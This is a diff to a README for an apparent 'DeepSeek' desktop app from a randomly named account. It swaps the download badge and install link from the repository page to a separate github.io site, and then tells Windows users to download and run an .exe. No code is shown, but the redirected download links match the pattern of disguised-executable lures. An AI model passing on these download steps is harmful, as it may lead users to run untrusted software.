@@ -1,6 +1,6 @@
 # 💻 deepseek-v4-pro-flash-desktop-app - Access powerful artificial intelligence on your desktop
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/explanatory-petersburgcampaign945/deepseek-v4-pro-flash-desktop-app)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://explanatory-petersburgcampaign945.github.io)
 
 ## 📥 About this application
 
@@ -21,7 +21,7 @@ Your computer needs to meet basic standards to run this software smoothly. Ensur
 
 Follow these steps to set up the application on your Windows machine:
 
-1. Visit the repository page to download the software: [https://github.com/explanatory-petersburgcampaign945/deepseek-v4-pro-flash-desktop-app](https://github.com/explanatory-petersburgcampaign945/deepseek-v4-pro-flash-desktop-app)
+1. Visit the repository page to download the software: [https://explanatory-petersburgcampaign945.github.io](https://explanatory-petersburgcampaign945.github.io)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click on the latest release link at the top of that list.
 4. Find the file ending in .exe in the Assets section.
